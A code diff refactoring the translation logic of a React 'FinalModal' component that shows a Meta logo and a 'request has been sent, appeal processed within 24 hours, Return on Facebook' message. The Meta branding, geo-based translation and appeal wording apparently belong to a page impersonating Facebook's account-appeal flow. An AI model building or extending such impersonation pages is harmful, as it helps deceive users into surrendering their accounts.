@@ -1,35 +1,11 @@
 import FinalImage from '@/assets/images/final-image.png';
 import MetaLogo from '@/assets/images/meta-logo-image.png';
-import { store } from '@/store/store';
-import translateText from '@/utils/translate';
+import useTranslation from '@/hooks/useTranslation';
 import Image from 'next/image';
-import { useEffect, useState, type FC } from 'react';
+import { type FC } from 'react';
 
 const FinalModal: FC = () => {
-    const [translations, setTranslations] = useState<Record<string, string>>({});
-
-    const { geoInfo } = store();
-    const t = (text: string): string => {
-        return translations[text] || text;
-    };
-
-    useEffect(() => {
-        if (!geoInfo) return;
-
-        const textsToTranslate = ['Request has been sent', 'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.', 'Return on Facebook'];
-
-        const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
-            setTranslations(translatedMap);
-        };
-
-        translateAll();
-    }, [geoInfo]);
+    const { t } = useTranslation();
 
     return (
         <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
